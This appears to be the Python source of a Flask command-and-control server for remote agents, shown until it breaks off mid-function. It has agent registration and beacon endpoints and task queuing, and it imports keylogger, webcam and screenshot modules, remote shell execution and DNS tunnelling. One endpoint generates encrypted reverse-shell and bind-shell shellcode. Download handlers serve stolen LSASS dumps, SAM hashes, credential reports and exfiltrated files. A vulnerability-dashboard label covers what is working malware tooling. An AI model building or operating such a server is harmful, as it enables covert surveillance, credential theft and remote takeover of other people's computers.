#!/usr/bin/env python3
import sys
import os
import platform
import time
import json
import base64
import logging
import hashlib
from datetime import datetime, timedelta
import threading
import requests
from typing import Optional, Dict, List, Any

from flask import Flask, render_template, request, jsonify, redirect, url_for, flash, send_file, Response
from flask_login import LoginManager, login_required, login_user, logout_user, current_user
from werkzeug.security import check_password_hash
from cryptography.fernet import Fernet

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)

# Fix: Add correct module path BEFORE importing
MODULES_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), 'modules'))
if MODULES_PATH not in sys.path:
    sys.path.append(MODULES_PATH)

# Import modules
from shellcode_generator import ShellcodeGenerator
from modules.dns_tunnel.tunnel import DNSTunnel, create_server
from modules.system import get_info
from modules.process import list_processes, kill_process
from modules.surveillance import take_screenshot, capture_webcam, start_keylogger, stop_keylogger
from modules.files import list_directory, get_file_info, read_file, write_file, delete_file
from modules.shell import execute
from models import User, users

# Import vulnerability dashboard
from vulnerability_dashboard import dashboard

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())

# Initialize login manager
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

@login_manager.user_loader
def load_user(user_id):
    return User.get(user_id)

# Initialize components
shellcode_gen = ShellcodeGenerator()
dns_tunnel = create_server("example.com")

# Data stores
agents = {}
tasks = {}
results = {}

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in users and check_password_hash(users[username], password):
            user = User(username)
            login_user(user)
            return redirect(url_for('index'))
        
        flash('Invalid username or password')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    return render_template('dashboard_enhanced.html')

@app.route('/dashboard')
@login_required
def dashboard_page():
    return render_template('dashboard_enhanced.html')

@app.route('/shellcode')
@login_required
def shellcode():
    return render_template('shellcode.html')

@app.route('/control')
@login_required
def control():
    return render_template('control.html')

# Import for datetime operations
from datetime import datetime, timedelta

# Encryption constants and functions (matching agent)
_KEY_B64 = 'dGhpcyBpcyBhIHNlY3JldCBrZXkgZm9yIGVuY3J5cHRpb24='
ENCRYPTION_KEY = _KEY_B64.encode()

def get_encryption_key(agent_id):
    """Generate a consistent encryption key for agent"""
    key_material = ENCRYPTION_KEY + agent_id.encode()
    key_hash = hashlib.sha256(key_material).digest()
    return base64.urlsafe_b64encode(key_hash[:32])

def decrypt_agent_data(encrypted_data, agent_id):
    """Decrypt data from agent using Fernet encryption"""
    try:
        # First decode base64
        encrypted_bytes = base64.b64decode(encrypted_data)
        # Then decrypt with Fernet
        fernet = Fernet(get_encryption_key(agent_id))
        decrypted_bytes = fernet.decrypt(encrypted_bytes)
        # Convert to string and parse JSON
        return json.loads(decrypted_bytes.decode())
    except Exception as e:
        logging.error(f"Decryption error: {e}")
        # Fallback to old base64 method
        try:
            decoded_json = base64.b64decode(encrypted_data).decode()
            return json.loads(decoded_json)
        except Exception as e2:
            logging.error(f"Base64 fallback failed: {e2}")
            raise

# New API endpoints for vulnerability dashboard
@app.route('/api/vulnerabilities')
@login_required
def get_vulnerabilities():
    """Get all vulnerability data from agents"""
    try:
        # Use the vulnerability dashboard for processed data
        dashboard_vulns = dashboard.get_vulnerabilities()
        
        # Group vulnerabilities by agent
        vulnerability_data = {}
        agent_vuln_counts = {}
        agent_risk_scores = {}
        
        for vuln in dashboard_vulns:
            agent_id = vuln.get('agent_id')
            if agent_id:
                if agent_id not in vulnerability_data:
                    vulnerability_data[agent_id] = {
                        'agent_id': agent_id,
                        'vulnerabilities': [],
                        'risk_score': 0,
                        'total_vulnerabilities': 0,
                        'last_scan': datetime.now().isoformat()
                    }
                    agent_vuln_counts[agent_id] = 0
                    agent_risk_scores[agent_id] = 0
                
                vulnerability_data[agent_id]['vulnerabilities'].append(vuln)
                agent_vuln_counts[agent_id] += 1
                
                # Calculate risk score based on severity
                severity = vuln.get('severity', 'Low')
                severity_scores = {'Critical': 10, 'High': 7, 'Medium': 4, 'Low': 1, 'Info': 0}
                agent_risk_scores[agent_id] += severity_scores.get(severity, 1)
        
        # Update the vulnerability data with counts and risk scores
        for agent_id in vulnerability_data:
            vulnerability_data[agent_id]['total_vulnerabilities'] = agent_vuln_counts[agent_id]
            vulnerability_data[agent_id]['risk_score'] = min(100, agent_risk_scores[agent_id])  # Cap at 100
        
        logging.info(f"Returning vulnerability data for {len(vulnerability_data)} agents with {sum(agent_vuln_counts.values())} total vulnerabilities")
        return jsonify(vulnerability_data)
        
    except Exception as e:
        logging.error(f"Error getting vulnerabilities: {e}")
        logging.error(f"Exception details: {type(e).__name__}: {str(e)}")
        import traceback
        logging.error(f"Traceback: {traceback.format_exc()}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/agents')
@login_required  
def get_agents_api():
    """Get all agent data - Main endpoint for dashboard and control panel"""
    try:
        agents_data = []
        current_time = datetime.now()
        
        for agent_id, agent_data in agents.items():
            # Determine agent status
            status = 'offline'
            if 'last_seen' in agent_data:
                try:
                    last_seen = datetime.fromisoformat(agent_data['last_seen'])
                    if current_time - last_seen < timedelta(minutes=5):
                        status = 'online'
                except:
                    pass
            
            # Create a summary of the agent data
            agent_summary = {
                'agent_id': agent_id,
                'last_seen': agent_data.get('last_seen', 'Unknown'),
                'status': status,
                'system_info': agent_data.get('system_info', {}),
                'results_count': len(agent_data.get('results', {})),
                'metrics': agent_data.get('metrics', {}),
                'module_status': agent_data.get('module_status', {})
            }
            
            # Add basic vulnerability count from results
            agent_summary['vulnerability_count'] = len(results.get(agent_id, []))
            
            agents_data.append(agent_summary)
        
        return jsonify({
            'status': 'success',
            'agents': agents_data
        })
        
    except Exception as e:
        logging.error(f"Error getting agents: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/scan-history')
@login_required
def get_scan_history():
    """Get scan history data"""
    try:
        # Use the vulnerability dashboard for processed scan data
        dashboard_scans = dashboard.scans
        
        scan_history = []
        
        # Convert dashboard scans to scan history format
        for scan_id, scan_data in dashboard_scans.items():
            scan_entry = {
                'agent_id': scan_data.get('agent_id', 'Unknown'),
                'scan_type': scan_data.get('scan_type', 'Unknown'),
                'timestamp': scan_data.get('timestamp', datetime.now().isoformat()),
                'vulnerability_count': len([v for v in dashboard.get_vulnerabilities() 
                                          if v.get('agent_id') == scan_data.get('agent_id') and 
                                          v.get('scan_source') == scan_data.get('scan_type')]),
                'risk_score': scan_data.get('severity_breakdown', {}).get('Critical', 0) * 10 + 
                             scan_data.get('severity_breakdown', {}).get('High', 0) * 7 +
                             scan_data.get('severity_breakdown', {}).get('Medium', 0) * 4 +
                             scan_data.get('severity_breakdown', {}).get('Low', 0) * 1,
                'status': scan_data.get('status', 'unknown'),
                'severity_breakdown': scan_data.get('severity_breakdown', {})
            }
            scan_history.append(scan_entry)
        
        # Sort by timestamp (newest first)
        scan_history.sort(key=lambda x: x['timestamp'], reverse=True)
        
        logging.info(f"Returning scan history with {len(scan_history)} scans")
        return jsonify(scan_history[:50])  # Return last 50 scans
        
    except Exception as e:
        logging.error(f"Error getting scan history: {e}")
        import traceback
        logging.error(f"Traceback: {traceback.format_exc()}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/dashboard')
@login_required
def get_dashboard_data():
    """Get comprehensive dashboard data"""
    try:
        # Use the vulnerability dashboard instance for processed data
        dashboard_data = dashboard.get_dashboard_data()
        
        # Get agent data  
        agent_response = get_agents_api()
        agent_data = agent_response.get_json() if hasattr(agent_response, 'get_json') else {}
        
        # Get vulnerability data from dashboard
        vuln_data = dashboard.get_vulnerabilities()
        
        # Calculate summary statistics from processed dashboard data
        summary = dashboard_data.get('summary', {})
        
        # Count active agents
        active_agents = len([a for a in agent_data.values() if a.get('status') == 'online'])
        
        dashboard_summary = {
            'total_vulnerabilities': summary.get('total_vulnerabilities', 0),
            'critical_vulnerabilities': dashboard_data.get('vulnerabilities', {}).get('severity_breakdown', {}).get('Critical', 0),
            'high_vulnerabilities': dashboard_data.get('vulnerabilities', {}).get('severity_breakdown', {}).get('High', 0),
            'medium_vulnerabilities': dashboard_data.get('vulnerabilities', {}).get('severity_breakdown', {}).get('Medium', 0),
            'low_vulnerabilities': dashboard_data.get('vulnerabilities', {}).get('severity_breakdown', {}).get('Low', 0),
            'overall_risk_score': summary.get('overall_risk_score', 0),
            'total_agents': len(agent_data),
            'active_agents': active_agents,
            'last_updated': datetime.now().isoformat()
        }
        
        return jsonify({
            'summary': dashboard_summary,
            'vulnerabilities': vuln_data,
            'agents': agent_data,
            'dashboard_data': dashboard_data
        })
        
    except Exception as e:
        logging.error(f"Error getting dashboard data: {e}")
        import traceback
        logging.error(f"Traceback: {traceback.format_exc()}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/pdf')
@login_required
def export_pdf():
    """Export vulnerability report as PDF"""
    try:
        # Generate PDF report (placeholder)
        from io import BytesIO
        import tempfile
        
        # Create a simple text report for now
        report_data = get_dashboard_data().get_json()
        
        report_text = f"""
VULNERABILITY ASSESSMENT REPORT
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

SUMMARY:
- Total Vulnerabilities: {report_data['summary']['total_vulnerabilities']}
- Critical: {report_data['summary']['critical_vulnerabilities']}
- High: {report_data['summary']['high_vulnerabilities']}
- Medium: {report_data['summary']['medium_vulnerabilities']}
- Low: {report_data['summary']['low_vulnerabilities']}
- Overall Risk Score: {report_data['summary']['overall_risk_score']}/100
- Active Agents: {report_data['summary']['active_agents']}/{report_data['summary']['total_agents']}

DETAILED FINDINGS:
"""
        
        # Add vulnerability details
        for agent_id, agent_vulns in report_data['vulnerabilities'].items():
            report_text += f"\nAgent: {agent_id}\n"
            report_text += f"Risk Score: {agent_vulns.get('risk_score', 0)}/100\n"
            for vuln in agent_vulns.get('vulnerabilities', []):
                report_text += f"- {vuln.get('severity', 'Unknown').upper()}: {vuln.get('title', vuln.get('cve', 'Unknown'))}\n"
        
        # Create temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(report_text)
            temp_path = f.name
        
        return send_file(temp_path, as_attachment=True, download_name='vulnerability_report.txt')
        
    except Exception as e:
        logging.error(f"Error exporting PDF: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/csv')
@login_required
def export_csv():
    """Export vulnerability data as CSV"""
    try:
        import csv
        from io import StringIO
        
        output = StringIO()
        writer = csv.writer(output)
        
        # Write header
        writer.writerow(['Agent ID', 'CVE', 'Title', 'Severity', 'Description', 'Risk Score'])
        
        # Get vulnerability data
        vuln_data = get_vulnerabilities().get_json()
        
        # Write vulnerability data
        for agent_id, agent_vulns in vuln_data.items():
            for vuln in agent_vulns.get('vulnerabilities', []):
                writer.writerow([
                    agent_id,
                    vuln.get('cve', ''),
                    vuln.get('title', ''),
                    vuln.get('severity', ''),
                    vuln.get('description', ''),
                    agent_vulns.get('risk_score', 0)
                ])
        
        response = Response(
            output.getvalue(),
            mimetype='text/csv',
            headers={'Content-Disposition': 'attachment; filename=vulnerabilities.csv'}
        )
        return response
        
    except Exception as e:
        logging.error(f"Error exporting CSV: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/export/json')
@login_required
def export_json():
    """Export vulnerability data as JSON"""
    try:
        dashboard_data = get_dashboard_data().get_json()
        
        response = Response(
            json.dumps(dashboard_data, indent=2),
            mimetype='application/json',
            headers={'Content-Disposition': 'attachment; filename=vulnerabilities.json'}
        )
        return response
        
    except Exception as e:
        logging.error(f"Error exporting JSON: {e}")
        return jsonify({'error': str(e)}), 500

# Additional API endpoints for the enhanced dashboard functionality
@app.route('/api/security-events')
@login_required
def get_security_events():
    """Get security events from agents"""
    try:
        security_events = []
        
        # Create security events from agent activity
        for agent_id, agent_data in agents.items():
            metrics = agent_data.get('metrics', {})
            if metrics.get('cpu_usage', 0) > 80:
                security_events.append({
                    'type': 'High CPU Usage',
                    'severity': 'Medium',
                    'agent': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
                    'agent_id': agent_id,
                    'description': f"CPU usage at {metrics.get('cpu_usage', 0):.1f}%",
                    'timestamp': datetime.now().isoformat()
                })
            if metrics.get('memory_usage', 0) > 85:
                security_events.append({
                    'type': 'High Memory Usage', 
                    'severity': 'Medium',
                    'agent': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
                    'agent_id': agent_id,
                    'description': f"Memory usage at {metrics.get('memory_usage', 0):.1f}%",
                    'timestamp': datetime.now().isoformat()
                })
        
        return jsonify(security_events)
        
    except Exception as e:
        logging.error(f"Error getting security events: {e}")
        return jsonify({'error': str(e)}), 500

# Removed duplicate endpoint - consolidated with get_agents_api()

@app.route('/api/reports')
@login_required
def get_reports():
    """Get all generated reports"""
    try:
        reports = list(dashboard.reports.values())
        return jsonify({
            'status': 'success',
            'reports': reports
        })
    except Exception as e:
        logging.error(f"Error getting reports: {str(e)}")
        return jsonify({
            'status': 'error',
            'error': str(e)
        }), 500

@app.route('/api/reports/generate', methods=['POST'])
@login_required
def generate_report():
    """Generate a new vulnerability report"""
    try:
        data = request.get_json()
        report_type = data.get('type', 'comprehensive')
        
        report = dashboard.get_vulnerability_report(report_type)
        
        return jsonify({
            'status': 'success',
            'report': report
        })
    except Exception as e:
        logging.error(f"Error generating report: {str(e)}")
        return jsonify({
            'status': 'error',
            'error': str(e)
        }), 500

@app.route('/api/reports/<report_id>/download')
@login_required
def download_report(report_id):
    """Download a report in specified format"""
    try:
        format_type = request.args.get('format', 'json')
        export_result = dashboard.export_report(report_id, format_type)
        
        if export_result['status'] == 'success':
            if format_type == 'json':
                return jsonify(export_result['data'])
            elif format_type == 'csv':
                return Response(
                    export_result['data'],
                    mimetype='text/csv',
                    headers={'Content-Disposition': f'attachment;filename=report_{report_id}.csv'}
                )
        else:
            return jsonify(export_result), 400
            
    except Exception as e:
        logging.error(f"Error downloading report: {str(e)}")
        return jsonify({
            'status': 'error',
            'error': str(e)
        }), 500

@app.route('/api/generate_shellcode', methods=['POST'])
def generate_shellcode():
    try:
        data = request.get_json()
        shellcode_type = data.get('type')
        platform = data.get('platform', 'windows')
        encoding = data.get('encoding', 'base64')
        encryption = data.get('encryption', 'none')
        key = data.get('key', '')
        payload = data.get('payload')
        custom_payload = data.get('custom_payload', '')
        shellcode = None

        # Use custom payload if selected
        if payload == 'custom' and custom_payload:
            msf_payload = custom_payload
        else:
            msf_payload = payload

        if shellcode_type == 'reverse':
            host = data.get('host')
            port = int(data.get('port', 0))
            if not host or not port:
                return jsonify({'success': False, 'error': 'Host and port are required'}), 400
            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)

        elif shellcode_type == 'bind':
            port = int(data.get('port', 0))
            if not port:
                return jsonify({'success': False, 'error': 'Port is required'}), 400
            shellcode = shellcode_gen.generate_bind_shell(port, platform, msf_payload)

        elif shellcode_type == 'exec':
            command = data.get('command')
            if not command:
                return jsonify({'success': False, 'error': 'Command is required'}), 400
            shellcode = shellcode_gen.generate_exec(command, platform)

        else:
            return jsonify({'success': False, 'error': 'Invalid shellcode type specified'}), 400

        if shellcode is None:
            return jsonify({'success': False, 'error': 'Shellcode generation failed.'}), 500

        if encryption == 'xor':
            shellcode = shellcode_gen.xor_encrypt(shellcode, key or "defaultxor")
        elif encryption == 'aes':
            shellcode = shellcode_gen.aes_encrypt(shellcode, key or "defaultaes")

        encoded = shellcode_gen.encode_shellcode(shellcode, encoding)
        if encoded is None:
            return jsonify({'success': False, 'error': 'Encoding failed'}), 500

        return jsonify({'success': True, 'shellcode': encoded.decode() if isinstance(encoded, bytes) else encoded})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# Removed duplicate endpoint - consolidated with get_agents_api()

@app.route('/api/debug/agents')
def debug_agents():
    """Debug endpoint to check agent registration"""
    return jsonify({
        'agents_count': len(agents),
        'agents': agents,
        'results_count': len(results),
        'results_keys': list(results.keys())
    })

@app.route('/api/debug/results')
def debug_results():
    """Debug endpoint to check results structure"""
    return jsonify({
        'results_count': len(results),
        'results': results
    })

@app.route('/api/agents/register', methods=['POST'])
def register_agent():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')
        if not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400

        decoded_json = base64.b64decode(encoded_data).decode()
        data = json.loads(decoded_json)
            
        agent_id = data.get('agent_id')

        if agent_id:
            if agent_id in agents:
                agents[agent_id].update(data)
                agents[agent_id]['last_seen'] = datetime.now().isoformat()
            else:
                agents[agent_id] = data
                agents[agent_id]['last_seen'] = datetime.now().isoformat()
                agents[agent_id]['results'] = {}

            # Process vulnerability data if present
            if 'vulnerabilities' in data or 'scan_type' in data:
                try:
                    dashboard.process_vulnerability_data(agent_id, data)
                except Exception as e:
                    logging.error(f"Error processing vulnerability data: {str(e)}")

            logging.info(f"Registered agent: {agent_id}")
            return jsonify({'status': 'success'})

        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400

    except Exception as e:
        logging.error(f"Registration error: {str(e)}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/agents/beacon', methods=['POST'])
def agent_beacon():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')
        if not encoded_data:
            return jsonify({'status': 'error', 'message': 'Missing data'}), 400

        decoded_json = base64.b64decode(encoded_data).decode()
        data = json.loads(decoded_json)
            
        agent_id = data.get('agent_id')
        timestamp = datetime.now().isoformat()

        if agent_id:
            if agent_id in agents:
                agents[agent_id]['last_seen'] = timestamp
                agents[agent_id]['status'] = data.get('status', 'online')
                # Update system info if provided
                if 'system_info' in data:
                    agents[agent_id]['system_info'] = data.get('system_info')
                # Update metrics if provided
                if 'metrics' in data:
                    agents[agent_id]['metrics'] = data.get('metrics')
                logging.debug(f"Updated existing agent {agent_id}: {agents[agent_id]}")
            else:
                agents[agent_id] = {
                    'agent_id': agent_id,
                    'system_info': data.get('system_info'),
                    'metrics': data.get('metrics', {}),
                    'status': data.get('status'),
                    'last_seen': timestamp,
                    'results': {}
                }
                logging.debug(f"Created new agent {agent_id}: {agents[agent_id]}")
            
            logging.debug(f"Total agents in dictionary: {len(agents)}")

            # Process vulnerability data if present
            if 'vulnerabilities' in data or 'scan_type' in data:
                try:
                    dashboard.process_vulnerability_data(agent_id, data)
                except Exception as e:
                    logging.error(f"Error processing vulnerability data in beacon: {str(e)}")

            logging.info(f"Beacon received from {agent_id}")
            return jsonify({'status': 'ok', 'message': 'Beacon received'})

        return jsonify({'status': 'error', 'message': 'Missing agent_id'}), 400

    except Exception as e:
        logging.error(f"Beacon error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/tasks', methods=['POST'])
@login_required
def create_task():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        module = data.get('module')
        params = data.get('params', {})

        if not agent_id or not module:
            return jsonify({
                'status': 'error',
                'message': 'Missing required fields'
            }), 400

        # Create task with the correct format for the agent
        task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # Convert module path to type (e.g., 'modules.system.get_info' -> 'system_info')
        task_type = module.replace('modules.', '').replace('.', '_')
        
        task = {
            'task_id': task_id,
            'type': task_type,
            'data': params,
            'status': 'pending',
            'timestamp': datetime.now().isoformat()
        }

        # Add task to queue
        if agent_id not in tasks:
            tasks[agent_id] = []
        tasks[agent_id].append(task)

        logging.info(f"Task {task_id} created for agent {agent_id}: {task_type}")
        logging.debug(f"Task details: {json.dumps(task, indent=2)}")
        return jsonify({
            'status': 'success',
            'task_id': task_id
        })

    except Exception as e:
        logging.error(f"Error creating task: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/tasks/<agent_id>', methods=['GET'])
def get_tasks(agent_id):
    try:
        if agent_id not in agents:
            logging.warning(f"Unknown agent tried to get tasks: {agent_id}")
            return jsonify({
                'status': 'error',
                'message': 'Unknown agent'
            }), 404

        # Update agent's last seen timestamp
        agents[agent_id]['last_seen'] = datetime.now().isoformat()

        # Get pending tasks
        agent_tasks = tasks.get(agent_id, [])
        if not agent_tasks:
            logging.debug(f"No pending tasks for agent {agent_id}")
            return jsonify([])

        # Get the next task
        next_task = agent_tasks.pop(0)
        logging.info(f"Sending task {next_task['task_id']} to agent {agent_id}")
        logging.debug(f"Task details: {json.dumps(next_task, indent=2)}")

        # Encode task data
        encoded_data = base64.b64encode(json.dumps(next_task).encode()).decode()
        return jsonify({'data': encoded_data})

    except Exception as e:
        logging.error(f"Error getting tasks for agent {agent_id}: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/results', methods=['POST'])
def receive_result():
    try:
        wrapper = request.get_json()
        encoded_data = wrapper.get('data')
        if not encoded_data:
            logging.warning("Received result without data")
            return jsonify({
                'status': 'error',
                'message': 'Missing data'
            }), 400

        # Accept both base64 string and dict
        if isinstance(encoded_data, dict):
            data = encoded_data
        else:
            try:
                decoded_json = base64.b64decode(encoded_data).decode()
                data = json.loads(decoded_json)
            except Exception as e:
                logging.error(f"Error decoding result data: {str(e)}")
                return jsonify({
                    'status': 'error',
                    'message': 'Invalid data format'
                }), 400

        agent_id = data.get('agent_id')
        task_id = data.get('task_id')
        result = data.get('result')
        timestamp = data.get('timestamp', datetime.now().isoformat())

        if not agent_id or not task_id:
            logging.warning(f"Received result with missing fields: agent_id={agent_id}, task_id={task_id}")
            return jsonify({
                'status': 'error',
                'message': 'Missing required fields'
            }), 400

        # Validate and sanitize result data
        if isinstance(result, dict):
            # Handle image data
            if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
                try:
                    # Validate base64 image data
                    base64.b64decode(result['data'])
                except Exception as e:
                    logging.error(f"Invalid image data in result: {str(e)}")
                    result = {'error': 'Invalid image data'}
            
            # Handle file data
            elif 'data' in result and result.get('path'):
                try:
                    # Validate base64 file data
                    base64.b64decode(result['data'])
                except Exception as e:
                    logging.error(f"Invalid file data in result: {str(e)}")
                    result = {'error': 'Invalid file data'}

        logging.info(f"Processing result from agent {agent_id} for task {task_id}")
        logging.debug(f"Result data: {json.dumps(result, indent=2)}")

        # Store result with metadata
        if agent_id not in results:
            results[agent_id] = {}
        results[agent_id][task_id] = {
            'result': result,
            'timestamp': timestamp,
            'processed': False,
            'type': data.get('type', ''),
            'status': data.get('status', 'success'),
            'error': data.get('error', None)
        }

        # Update agent's results
        if agent_id in agents:
            if 'results' not in agents[agent_id]:
                agents[agent_id]['results'] = {}
            agents[agent_id]['results'][task_id] = {
                'result': result,
                'timestamp': timestamp,
                'type': data.get('type', ''),
                'status': data.get('status', 'success')
            }

        # Process vulnerability data if present
        if 'vulnerabilities' in result or 'scan_type' in result:
            dashboard.process_vulnerability_data(agent_id, result)

        logging.info(f"Successfully stored result from agent {agent_id} for task {task_id}")
        return jsonify({'status': 'success'})

    except Exception as e:
        logging.error(f"Error processing result: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/results/<agent_id>', methods=['GET'])
def get_results_for_agent(agent_id):
    """Get all results for a specific agent"""
    agent_results = []
    if agent_id in results:
        for task_id, entry in results[agent_id].items():
            agent_results.append({
                'task_id': task_id,
                'result': entry.get('result'),
                'timestamp': entry.get('timestamp'),
                'status': 'success',
                'type': entry.get('result', {}).get('type', '')
            })
    return jsonify({'status': 'success', 'results': agent_results})

@app.route('/api/results', methods=['GET'])
@login_required
def get_all_results():
    """Get all results from all agents"""
    all_results = []
    
    for agent_id, agent_results in results.items():
        for task_id, entry in agent_results.items():
            result_type = 'unknown'
            if isinstance(entry.get('result'), dict):
                # Check for screenshot data in various formats
                if ('image' in entry['result'] and 'format' in entry['result']) or \
                   ('data' in entry['result'] and 'format' in entry['result'] and 
                    entry['result'].get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']):
                    result_type = 'surveillance_screenshot'
                elif 'type' in entry['result']:
                    result_type = entry['result']['type']
                elif 'result' in entry['result'] and isinstance(entry['result']['result'], dict):
                    inner_result = entry['result']['result']
                    # Check for nested screenshot data
                    if ('image' in inner_result and 'format' in inner_result) or \
                       ('data' in inner_result and 'format' in inner_result and 
                        inner_result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']):
                        result_type = 'surveillance_screenshot'
                    else:
                        result_type = inner_result.get('type', 'unknown')
            
            all_results.append({
                'id': task_id,
                'agent_id': agent_id,
                'type': result_type,
                'result': entry.get('result'),
                'timestamp': entry.get('timestamp'),
                'status': 'SUCCESS' if entry.get('result') else 'FAILED'
            })
    
    # Sort by timestamp (newest first)
    all_results.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    
    return jsonify({'status': 'success', 'results': all_results})

@app.route('/api/results/download/<task_id>', methods=['GET'])
def download_result(task_id):
    import base64, os, json, mimetypes
    for agent_id, agent_results in results.items():
        if task_id in agent_results:
            entry = agent_results[task_id]
            result = entry.get('result', {})
            try:
                # Debug: Log the result structure for troubleshooting
                logging.debug(f"Download request for task {task_id}")
                logging.debug(f"Result type: {type(result)}")
                logging.debug(f"Result keys: {list(result.keys()) if isinstance(result, dict) else 'N/A'}")
                if isinstance(result, dict) and 'result' in result:
                    logging.debug(f"Inner result keys: {list(result['result'].keys()) if isinstance(result['result'], dict) else 'N/A'}")
                
                # Handle credential dump download  
                if isinstance(result, dict):
                    # Priority 1: Check for report_file (comprehensive credential report)
                    report_file = None
                    if 'report_file' in result:
                        report_file = result['report_file']
                    elif 'result' in result and isinstance(result['result'], dict) and 'report_file' in result['result']:
                        report_file = result['result']['report_file']
                    
                    if report_file and 'file_data' in report_file:
                        file_data = base64.b64decode(report_file['file_data'])
                        filename = report_file.get('filename', f'credential_report_{task_id}.json')
                        return Response(file_data, mimetype='application/json', headers={
                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                        })
                    
                    # Priority 2: Check for LSASS dump in nested result data
                    lsass_data = None
                    if 'data' in result and 'lsass_dump' in result.get('data', {}):
                        lsass_data = result['data']['lsass_dump']
                    elif 'result' in result and isinstance(result['result'], dict) and 'data' in result['result'] and 'lsass_dump' in result['result'].get('data', {}):
                        lsass_data = result['result']['data']['lsass_dump']
                    
                    if lsass_data and 'file_data' in lsass_data:
                        file_data = base64.b64decode(lsass_data['file_data'])
                        filename = lsass_data.get('file', f'lsass_dump_{task_id}.bin')
                        return Response(file_data, mimetype='application/octet-stream', headers={
                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                        })
                    
                    # Priority 3: If credential dump task, create a JSON download from available data
                    if ('credentials_dump' in task_id.lower() or 
                        (result.get('type') == 'credentials_dump') or
                        ('result' in result and isinstance(result['result'], dict) and 'data' in result['result'] and 
                         any(key in result['result']['data'] for key in ['windows_credentials', 'sam_hashes', 'lsass_dump']))):
                        
                        # Create JSON download from existing data
                        import json
                        from datetime import datetime
                        json_data = json.dumps(result, indent=2, default=str)
                        filename = f'credentials_{task_id}_{datetime.now().strftime("%Y%m%d")}.json'
                        return Response(json_data, mimetype='application/json', headers={
                            'Content-Disposition': f'attachment;filename={filename}'
                        })
                    
                    # Priority 4: Check for any file_data in the result (general case)
                    if 'data' in result and 'file_data' in result.get('data', {}):
                        file_data = base64.b64decode(result['data']['file_data'])
                        filename = result['data'].get('filename', f'file_{task_id}.bin')
                        return Response(file_data, mimetype='application/octet-stream', headers={
                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                        })
                
                # Handle image download
                if isinstance(result, dict):
                    # Handle screenshot format: result['result']['image'] and result['result']['format']
                    if 'result' in result and isinstance(result['result'], dict):
                        inner_result = result['result']
                        if 'image' in inner_result and 'format' in inner_result:
                            file_data = base64.b64decode(inner_result['image'])
                            file_format = inner_result['format']
                            filename = f'screenshot_{task_id}.{file_format}'
                            mimetype = f'image/{file_format.lower()}'
                            return Response(file_data, mimetype=mimetype, headers={
                                'Content-Disposition': f'attachment;filename={filename}'
                            })
                    
                    # Handle file result where result['data'] is a dict (agent file exfil)
                    if 'data' in result and isinstance(result['data'], dict) and 'data' in result['data']:
                        file_data = base64.b64decode(result['data']['data'])
                        filename = result['data'].get('filename', f'{task_id}.bin')
                        mimetype, _ = mimetypes.guess_type(filename)
                        if not mimetype:
                            mimetype = 'application/octet-stream'
                        return Response(file_data, mimetype=mimetype, headers={
                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                        })
                    
                    # Handle direct image format: result['data'] and result['format']
                    if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
                        file_data = base64.b64decode(result['data'])
                        file_format = result.get('format', 'bin')
                        filename = result.get('filename') or f'{task_id}.{file_format}'
                        mimetype = f'image/{file_format.lower()}'
                        return Response(file_data, mimetype=mimetype, headers={
                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                        })
                    # Handle file download (legacy: result['data'] is base64, result['path'] is filename)
                    if 'data' in result and result.get('path'):
                        file_data = base64.b64decode(result['data'])
                        filename = os.path.basename(result['path'])
                        mimetype, _ = mimetypes.guess_type(filename)
                        if not mimetype:
                            mimetype = 'application/octet-stream'
                        return Response(file_data, mimetype=mimetype, headers={
                            'Content-Disposition': f'attachment;filename={filename}'
                        })
                    # Handle dictionary/JSON data
                    content = json.dumps(result, indent=2)
                    mimetype = 'application/json'
                    filename = f'{task_id}.json'
                    return Response(content, mimetype=mimetype, headers={
                        'Content-Disposition': f'attachment;filename={filename}'
                    })
                # Handle string data
                elif isinstance(result, str):
                    content = result
                    mimetype = 'text/plain'
